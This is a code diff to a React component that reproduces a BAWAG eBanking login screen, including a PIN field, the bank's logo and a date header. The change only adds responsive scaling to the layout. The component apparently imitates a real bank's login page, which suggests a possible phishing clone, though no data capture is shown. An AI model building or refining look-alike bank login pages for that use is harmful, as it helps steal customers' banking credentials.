@@ -62,14 +62,44 @@ const Bawag = () => {
   const [pin, setPin] = useState("");
   const [showPin, setShowPin] = useState(false);
   const [lang, setLang] = useState<Lang>("DE");
+  const [scale, setScale] = useState(1);
+  const contentRef = useRef<HTMLDivElement>(null);
+  const [contentHeight, setContentHeight] = useState(0);
+
+  const updateScale = useCallback(() => {
+    const s = Math.min(1, window.innerWidth / 970);
+    setScale(s);
+  }, []);
+
+  useEffect(() => {
+    updateScale();
+    window.addEventListener("resize", updateScale);
+    return () => window.removeEventListener("resize", updateScale);
+  }, [updateScale]);
+
+  useEffect(() => {
+    if (contentRef.current) {
+      setContentHeight(contentRef.current.scrollHeight);
+    }
+  });
 
   const t = translations[lang];
   const now = new Date();
   const dateStr = `${t.days[now.getDay()]}, ${String(now.getDate()).padStart(2, "0")}.${String(now.getMonth() + 1).padStart(2, "0")}.${now.getFullYear()}, ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
 
   return (
-    <div className="min-h-screen flex flex-col items-center bg-white" style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif" }}>
-      <div className="w-[970px]">
+    <div className="min-h-screen bg-white overflow-x-hidden" style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif" }}>
+      <div
+        ref={contentRef}
+        style={{
+          width: '970px',
+          margin: '0 auto',
+          transform: `scale(${scale})`,
+          transformOrigin: 'top center',
+          height: scale < 1 ? 'auto' : undefined,
+        }}
+      >
+        <div style={{ height: scale < 1 ? 0 : undefined }}>
         {/* Header */}
         <header className="bg-white border-b border-gray-200 px-4 py-2 flex items-center justify-between">
           <img src={bawagLogo} alt="BAWAG eBanking" className="h-20" />
